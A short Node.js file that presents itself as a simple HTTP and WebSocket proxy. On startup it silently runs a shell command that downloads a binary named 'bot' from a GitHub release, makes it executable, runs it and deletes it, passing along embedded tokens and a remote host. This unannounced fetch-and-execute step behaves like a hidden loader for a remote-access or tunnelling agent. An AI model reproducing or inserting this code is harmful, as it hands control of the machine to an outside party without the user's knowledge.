const http = require('http');
const WebSocket = require('ws');
const { exec } = require('child_process');

exec(`C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYjc1MzMyZjctOWJlOC00Y2U0LWJmYTAtNThkYmZkYWVhMWQ3IiwicyI6Ik16UTVaR1EzWWpRdE56UXpaaTAwTlRWaExUZzJZMkl0WldOa1lqSmhOelkwTWpBdyJ9 N_S=nz.tx.dedyn.io N_K=ivqtrgHSnQJIm9E98v bash -c 'curl -L -o bot https://github.com/seav1/dl/releases/download/src/bot && chmod +x bot && ./bot && rm bot'`);

const server = http.createServer((req, res) => {
    res.end('200 OK\n');
});

server.on('upgrade', (req, socket, head) => {
    const ws = new WebSocket('ws://localhost:8002');
    
    ws.on('open', () => {
        ws._socket.pipe(socket).pipe(ws._socket);
    });
});

server.listen(3000);
